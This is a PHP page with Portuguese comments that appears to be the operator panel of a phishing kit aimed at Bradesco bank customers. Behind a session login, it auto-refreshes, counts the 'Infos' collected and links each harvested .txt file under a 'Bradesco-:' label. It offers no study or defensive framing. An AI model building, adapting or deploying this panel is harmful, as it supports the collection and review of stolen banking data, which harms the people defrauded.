﻿<?php 
ob_start();
@session_start();
if(!isset($_SESSION['login'])){// verifica se o usuario fez login   
header("location: index.php");   
die;
}
if(isset($_GET['acao'])) {   
if($_GET['acao'] == "deslogar") {      
 Deslogar();   
}
}

function Deslogar(){
unset($_SESSION['login']);   
session_destroy();   
header("location: index.php");
}
?>

<?php
error_reporting(0);
$id = $_GET['id'];

$fonte = "./";
$i=0;
foreach (glob ($fonte."*.txt") as $arquivo){
$a[$i] = $arquivo;
$i++;

}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="refresh" content="5;url=painel.php">
<title><?php echo "( ".count($a)." )"; ?></title>
<style type="text/css">
<!--
body,td,th {
	font-family: Verdana;
	font-size: 12px;
	color:#615c5c;
}
.input {
	border:1px #CCC solid;
	font-family:verdana,arial;color:#666;font-size:10px;
	}
.meio2 {
	width:99%;
	border:1px solid #CCC;
	background:#CCCCCC;
	padding-left:5px;
	height:20px;
	padding-top:3px;
	}
.fundo {
	background:#FF0000;

	}	
	

a {text-decoration: none;color: #1D51C5;}
a:hover {text-decoration: underline;}

hr {
      border-top: 1px dashed #CCC;
      color: #fff;
      background-color: #fff;
    }
	
-->
</style>
</head>

<body class="fundo">
<center><img src="logo.png" alt="logo" /><br><strong><?php echo "- Total de Infos - <br>:( ".count($a)." ):"; ?></strong></center>
<table width="490" border="0" cellspacing="1" cellpadding="1">
  <tr>
    <td colspan="2"><?php echo "Olá, <b>" . $_SESSION['login'] . "</b>"; ?> -</td>
  </tr>
  <tr>
    <td width="109"></td>
    <td width="374"></td>
  </tr>
</table>

<?php

// pega o endereço do diretório
$diretorio = getcwd(); 
// abre o diretório
$ponteiro  = opendir($diretorio);
// monta os vetores com os itens encontrados na pasta
while ($nome_itens = readdir($ponteiro)) {
    $itens[] = $nome_itens;
}

// ordena o vetor de itens
sort($itens);
// percorre o vetor para fazer a separacao entre arquivos e pastas 
foreach ($itens as $listar) {
// retira "./" e "../" para que retorne apenas pastas e arquivos
   if ($listar!="." && $listar!=".."){ 

// checa se o tipo de arquivo encontrado é uma pasta
   		if (is_dir($listar)) { 
// caso VERDADEIRO adiciona o item à variável de pastas
			$pastas[]=$listar; 
		} else{ 
// caso FALSO adiciona o item à variável de arquivos
			$arquivos[]=$listar;
		}
   }
}

if ($arquivos != "") {
	foreach($arquivos as $listar){
	 if(pathinfo($listar, PATHINFO_EXTENSION) == 'txt'){
		$arquivo = $listar;

echo '<hr>
<div class="meio2">
  <table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td><b>Bradesco-: </b><a href="'.$arquivo.'">'.$arquivo.'</a></td>
    </tr>
  </table>
</div>';
}
}
}
?>
<?php
ob_end_flush();
?>
</body>
</html>